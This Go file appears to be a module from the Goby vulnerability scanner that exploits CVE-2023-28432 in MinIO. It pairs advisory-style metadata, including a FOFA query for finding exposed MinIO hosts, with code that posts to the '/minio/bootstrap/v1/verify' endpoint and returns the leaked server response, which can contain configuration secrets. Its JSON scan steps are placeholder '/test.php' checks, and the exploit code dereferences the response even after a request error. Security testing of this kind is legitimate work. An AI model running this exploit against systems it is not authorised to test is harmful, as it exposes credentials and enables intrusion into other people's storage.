package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "MiniO verify interface sensitive information disclosure vulnerability (CVE-2023-28432)",
    "Description": "<p>MinIO is an open source object storage service that is compatible with the Amazon S3 API and can be used in private or public clouds. MinIO is a high-performance, high-availability distributed storage system that can store large amounts of data and provide high-speed read and write capabilities for data. MinIO adopts a distributed architecture and can run on multiple nodes to realize distributed storage and processing of data.</p><p>There is a sensitive information disclosure vulnerability in the MiniO verify interface, which allows attackers to read sensitive system information by constructing special URL addresses.</p>",
    "Product": "minio",
    "Homepage": "https://github.com/minio/minio/",
    "DisclosureDate": "2023-03-20",
    "Author": "featherstark@outlook.com",
    "FofaQuery": "banner=\"MinIO\" || header=\"MinIO\" || title=\"MinIO\"",
    "GobyQuery": "banner=\"MinIO\" || header=\"MinIO\" || title=\"MinIO\"",
    "Level": "3",
    "Impact": "<p>There is a sensitive information disclosure vulnerability in the MiniO verify interface, which allows attackers to read sensitive system information by constructing special URL addresses.</p>",
    "Recommendation": "<p>The manufacturer has released a bug fix, please pay attention to the update in time:<a href=\"https://github.com/minio/minio/security/advisories/GHSA-6xvq-wj2x-3h3q\">https://github.com/minio/minio/security/advisories/GHSA-6xvq-wj2x-3h3q</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        "CVE-2023-28432"
    ],
    "CNNVD": [
        "CNNVD-202303-1795"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "MinIO verify 接口敏感信息泄露漏洞（CVE-2023-28432）",
            "Product": "minio",
            "Description": "<p><span style=\"color: var(--primaryFont-color);\">MinIO 是一种开源的对象存储服务，它兼容 Amazon S3 API，可以在私有云或公有云中使用。MinIO 是一种高性能、高可用性的分布式存储系统，它可以存储大量数据，并提供对数据的高速读写能力。MinIO 采用分布式架构，可以在多个节点上运行，从而实现数据的分布式存储和处理。<br></span></p><p><span style=\"color: var(--primaryFont-color);\">MinIO verify接口存在敏感信息泄漏漏洞，攻击者通过构造特殊URL地址，读取系统敏感信息。</span><br></p>",
            "Recommendation": "<p><span style=\"color: var(--primaryFont-color);\">厂商已发布了漏洞修复程序，请及时关注更新：</span><br></p><p><a href=\"https://github.com/minio/minio/security/advisories/GHSA-6xvq-wj2x-3h3q\" target=\"_blank\">https://github.com/minio/minio/security/advisories/GHSA-6xvq-wj2x-3h3q</a></p>",
            "Impact": "<p>MinIO verify接口存在敏感信息泄漏漏洞，攻击者通过构造特殊URL地址，读取系统敏感信息。</p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "MiniO verify interface sensitive information disclosure vulnerability (CVE-2023-28432)",
            "Product": "minio",
            "Description": "<p><span style=\"color: var(--primaryFont-color);\">MinIO is an open source object storage service that is compatible with the Amazon S3 API and can be used in private or public clouds. MinIO is a high-performance, high-availability distributed storage system that can store large amounts of data and provide high-speed read and write capabilities for data. MinIO adopts a distributed architecture and can run on multiple nodes to realize distributed storage and processing of data.<br></span></p><p><span style=\"color: var(--primaryFont-color);\">There is a sensitive information disclosure vulnerability in the MiniO verify interface, which allows attackers to read sensitive system information by constructing special URL addresses.</span><br></p>",
            "Recommendation": "<p><span style=\"color: var(--primaryFont-color);\">The manufacturer has released a bug fix, please pay attention to the update in time:</span><a href=\"https://github.com/minio/minio/security/advisories/GHSA-6xvq-wj2x-3h3q\" target=\"_blank\">https://github.com/minio/minio/security/advisories/GHSA-6xvq-wj2x-3h3q</a><br></p>",
            "Impact": "<p>There is a sensitive information disclosure vulnerability in the MiniO verify interface, which allows attackers to read sensitive system information by constructing special URL addresses.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10932"
}`
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			cfg := httpclient.NewPostRequestConfig("/minio/bootstrap/v1/verify")
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Header.Store("Content-Length", "0")
			resp, err := httpclient.DoHttpRequest(hostinfo, cfg)
			if err != nil {
				return false
			}
      if resp.StatusCode == 200 && (strings.Contains(resp.Utf8Html, `"MinioRuntime":`) && strings.Contains(resp.Utf8Html, `"ForceQuery":`) || strings.Contains(resp.Utf8Html, `"RawQuery":`) && strings.Contains(resp.Utf8Html, `"ForceQuery":`)) {
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cfg := httpclient.NewPostRequestConfig("/minio/bootstrap/v1/verify")
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Header.Store("Content-Length", "0")
			resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg)
			if err != nil {
				expResult.Success = false
			}
      if resp.StatusCode == 200 && (strings.Contains(resp.Utf8Html, `"MinioRuntime":`) && strings.Contains(resp.Utf8Html, `"ForceQuery":`) || strings.Contains(resp.Utf8Html, `"RawQuery":`) && strings.Contains(resp.Utf8Html, `"ForceQuery":`)) {
				expResult.Output = resp.Utf8Html
				expResult.Success = true
			}
			return expResult
		},
	))
}
